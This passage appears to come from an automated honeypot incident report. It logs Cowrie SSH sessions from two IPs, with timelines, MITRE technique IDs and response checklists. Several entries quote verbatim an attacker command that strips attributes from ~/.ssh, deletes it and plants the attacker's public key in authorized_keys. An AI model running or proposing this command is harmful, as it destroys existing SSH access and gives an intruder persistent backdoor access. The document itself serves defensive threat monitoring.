| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:06:18` | `cowrie.session.connect` |
| `2026-05-25 20:06:19` | `cowrie.client.version` |
| `2026-05-25 20:06:19` | `cowrie.client.kex` |
| `2026-05-25 20:06:20` | `cowrie.login.success` |
| `2026-05-25 20:06:20` | `cowrie.session.params` |
| `2026-05-25 20:06:20` | `cowrie.command.input` |
| `2026-05-25 20:06:20` | `cowrie.command.failed` |
| `2026-05-25 20:06:20` | `cowrie.log.closed` |
| `2026-05-25 20:06:21` | `cowrie.session.params` |
| `2026-05-25 20:06:21` | `cowrie.command.input` |
| `2026-05-25 20:06:21` | `cowrie.session.file_download` |
| `2026-05-25 20:06:21` | `cowrie.log.closed` |
| `2026-05-25 20:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9c6989ec8ee

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-05-25 20:06 |
| **Last Seen** | 2026-05-25 20:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:06:26` | `cowrie.session.connect` |
| `2026-05-25 20:06:26` | `cowrie.client.version` |
| `2026-05-25 20:06:26` | `cowrie.client.kex` |
| `2026-05-25 20:06:27` | `cowrie.login.success` |
| `2026-05-25 20:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3988ccec5ccc

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-05-25 20:07 |
| **Last Seen** | 2026-05-25 20:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:07:23` | `cowrie.session.connect` |
| `2026-05-25 20:07:23` | `cowrie.client.version` |
| `2026-05-25 20:07:23` | `cowrie.client.kex` |
| `2026-05-25 20:07:26` | `cowrie.login.success` |
| `2026-05-25 20:07:26` | `cowrie.session.params` |
| `2026-05-25 20:07:26` | `cowrie.command.input` |
| `2026-05-25 20:07:26` | `cowrie.command.failed` |
| `2026-05-25 20:07:26` | `cowrie.log.closed` |
| `2026-05-25 20:07:27` | `cowrie.session.params` |
| `2026-05-25 20:07:27` | `cowrie.command.input` |
| `2026-05-25 20:07:27` | `cowrie.session.file_download` |
| `2026-05-25 20:07:27` | `cowrie.log.closed` |
| `2026-05-25 20:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-100d895bf26d

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-05-25 20:07 |
| **Last Seen** | 2026-05-25 20:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:07:30` | `cowrie.session.connect` |
| `2026-05-25 20:07:30` | `cowrie.client.version` |
| `2026-05-25 20:07:30` | `cowrie.client.kex` |
| `2026-05-25 20:07:31` | `cowrie.login.success` |
| `2026-05-25 20:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-648aef24678a

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-05-25 20:08 |
| **Last Seen** | 2026-05-25 20:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:08:07` | `cowrie.session.connect` |
| `2026-05-25 20:08:07` | `cowrie.client.version` |
| `2026-05-25 20:08:08` | `cowrie.client.kex` |
| `2026-05-25 20:08:09` | `cowrie.login.success` |
| `2026-05-25 20:08:10` | `cowrie.session.params` |
| `2026-05-25 20:08:10` | `cowrie.command.input` |
| `2026-05-25 20:08:10` | `cowrie.command.failed` |
| `2026-05-25 20:08:10` | `cowrie.log.closed` |
| `2026-05-25 20:08:12` | `cowrie.session.params` |
| `2026-05-25 20:08:12` | `cowrie.command.input` |
| `2026-05-25 20:08:12` | `cowrie.session.file_download` |
| `2026-05-25 20:08:12` | `cowrie.log.closed` |
| `2026-05-25 20:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e493936334c

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-05-25 20:08 |
| **Last Seen** | 2026-05-25 20:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:08:15` | `cowrie.session.connect` |
| `2026-05-25 20:08:15` | `cowrie.client.version` |
| `2026-05-25 20:08:15` | `cowrie.client.kex` |
| `2026-05-25 20:08:16` | `cowrie.login.success` |
| `2026-05-25 20:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-834a5d908e52

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-05-25 20:10 |
| **Last Seen** | 2026-05-25 20:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:10:42` | `cowrie.session.connect` |
| `2026-05-25 20:10:42` | `cowrie.client.version` |
| `2026-05-25 20:10:42` | `cowrie.client.kex` |
| `2026-05-25 20:10:43` | `cowrie.login.success` |
| `2026-05-25 20:10:43` | `cowrie.session.params` |
| `2026-05-25 20:10:43` | `cowrie.command.input` |
| `2026-05-25 20:10:43` | `cowrie.command.failed` |
| `2026-05-25 20:10:43` | `cowrie.log.closed` |
| `2026-05-25 20:10:44` | `cowrie.session.params` |
| `2026-05-25 20:10:44` | `cowrie.command.input` |
| `2026-05-25 20:10:44` | `cowrie.session.file_download` |
| `2026-05-25 20:10:44` | `cowrie.log.closed` |
| `2026-05-25 20:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d3a03f2dba1

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-05-25 20:10 |
| **Last Seen** | 2026-05-25 20:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:10:48` | `cowrie.session.connect` |
| `2026-05-25 20:10:48` | `cowrie.client.version` |
| `2026-05-25 20:10:48` | `cowrie.client.kex` |
| `2026-05-25 20:10:49` | `cowrie.login.success` |
| `2026-05-25 20:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b931fcea2045

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:15 |
| **Last Seen** | 2026-05-25 20:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:15:20` | `cowrie.session.connect` |
| `2026-05-25 20:15:20` | `cowrie.client.version` |
| `2026-05-25 20:15:20` | `cowrie.client.kex` |
| `2026-05-25 20:15:20` | `cowrie.login.success` |
| `2026-05-25 20:15:21` | `cowrie.session.params` |
| `2026-05-25 20:15:21` | `cowrie.command.input` |
| `2026-05-25 20:15:21` | `cowrie.command.failed` |
| `2026-05-25 20:15:21` | `cowrie.log.closed` |
| `2026-05-25 20:15:21` | `cowrie.session.params` |
| `2026-05-25 20:15:21` | `cowrie.command.input` |
| `2026-05-25 20:15:22` | `cowrie.session.file_download` |
| `2026-05-25 20:15:22` | `cowrie.log.closed` |
| `2026-05-25 20:15:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b5e59e50f15

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:15 |
| **Last Seen** | 2026-05-25 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:15:24` | `cowrie.session.connect` |
| `2026-05-25 20:15:24` | `cowrie.client.version` |
| `2026-05-25 20:15:24` | `cowrie.client.kex` |
| `2026-05-25 20:15:25` | `cowrie.login.success` |
| `2026-05-25 20:15:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ec327ec146b

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:16 |
| **Last Seen** | 2026-05-25 20:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:16:54` | `cowrie.session.connect` |
| `2026-05-25 20:16:54` | `cowrie.client.version` |
| `2026-05-25 20:16:54` | `cowrie.client.kex` |
| `2026-05-25 20:16:55` | `cowrie.login.success` |
| `2026-05-25 20:16:55` | `cowrie.session.params` |
| `2026-05-25 20:16:55` | `cowrie.command.input` |
| `2026-05-25 20:16:55` | `cowrie.command.failed` |
| `2026-05-25 20:16:55` | `cowrie.log.closed` |
| `2026-05-25 20:16:56` | `cowrie.session.params` |
| `2026-05-25 20:16:56` | `cowrie.command.input` |
| `2026-05-25 20:16:56` | `cowrie.session.file_download` |
| `2026-05-25 20:16:56` | `cowrie.log.closed` |
| `2026-05-25 20:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25be23307717

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:16 |
| **Last Seen** | 2026-05-25 20:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:16:58` | `cowrie.session.connect` |
| `2026-05-25 20:16:58` | `cowrie.client.version` |
| `2026-05-25 20:16:58` | `cowrie.client.kex` |
| `2026-05-25 20:16:59` | `cowrie.login.success` |
| `2026-05-25 20:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54bd3766140a

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:17 |
| **Last Seen** | 2026-05-25 20:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:17:48` | `cowrie.session.connect` |
| `2026-05-25 20:17:48` | `cowrie.client.version` |
| `2026-05-25 20:17:49` | `cowrie.client.kex` |
| `2026-05-25 20:17:49` | `cowrie.login.success` |
| `2026-05-25 20:17:50` | `cowrie.session.params` |
| `2026-05-25 20:17:50` | `cowrie.command.input` |
| `2026-05-25 20:17:50` | `cowrie.command.failed` |
| `2026-05-25 20:17:50` | `cowrie.log.closed` |
| `2026-05-25 20:17:50` | `cowrie.session.params` |
| `2026-05-25 20:17:50` | `cowrie.command.input` |
| `2026-05-25 20:17:50` | `cowrie.session.file_download` |
| `2026-05-25 20:17:50` | `cowrie.log.closed` |
| `2026-05-25 20:17:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-107013098dfc

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:17 |
| **Last Seen** | 2026-05-25 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:17:53` | `cowrie.session.connect` |
| `2026-05-25 20:17:53` | `cowrie.client.version` |
| `2026-05-25 20:17:53` | `cowrie.client.kex` |
| `2026-05-25 20:17:53` | `cowrie.login.success` |
| `2026-05-25 20:17:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca8bd5f4d9a3

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:18 |
| **Last Seen** | 2026-05-25 20:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:18:23` | `cowrie.session.connect` |
| `2026-05-25 20:18:23` | `cowrie.client.version` |
| `2026-05-25 20:18:23` | `cowrie.client.kex` |
| `2026-05-25 20:18:24` | `cowrie.login.success` |
| `2026-05-25 20:18:24` | `cowrie.session.params` |
| `2026-05-25 20:18:24` | `cowrie.command.input` |
| `2026-05-25 20:18:24` | `cowrie.command.failed` |
| `2026-05-25 20:18:24` | `cowrie.log.closed` |
| `2026-05-25 20:18:24` | `cowrie.session.params` |
| `2026-05-25 20:18:24` | `cowrie.command.input` |
| `2026-05-25 20:18:25` | `cowrie.session.file_download` |
| `2026-05-25 20:18:25` | `cowrie.log.closed` |
| `2026-05-25 20:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b17202bd0e07

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:18 |
| **Last Seen** | 2026-05-25 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:18:27` | `cowrie.session.connect` |
| `2026-05-25 20:18:27` | `cowrie.client.version` |
| `2026-05-25 20:18:27` | `cowrie.client.kex` |
| `2026-05-25 20:18:28` | `cowrie.login.success` |
| `2026-05-25 20:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.167.207[.]234` to AbuseIPDB if not already reported
- [ ] Block `180.167.207[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56acf600085a

| Field | Detail |
|---|---|
| **Source IP** | `180.167.207[.]234` |
| **First Seen** | 2026-05-25 20:18 |
| **Last Seen** | 2026-05-25 20:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:18:40` | `cowrie.session.connect` |
| `2026-05-25 20:18:40` | `cowrie.client.version` |
| `2026-05-25 20:18:40` | `cowrie.client.kex` |
| `2026-05-25 20:18:41` | `cowrie.login.success` |
| `2026-05-25 20:18:41` | `cowrie.session.params` |
| `2026-05-25 20:18:41` | `cowrie.command.input` |
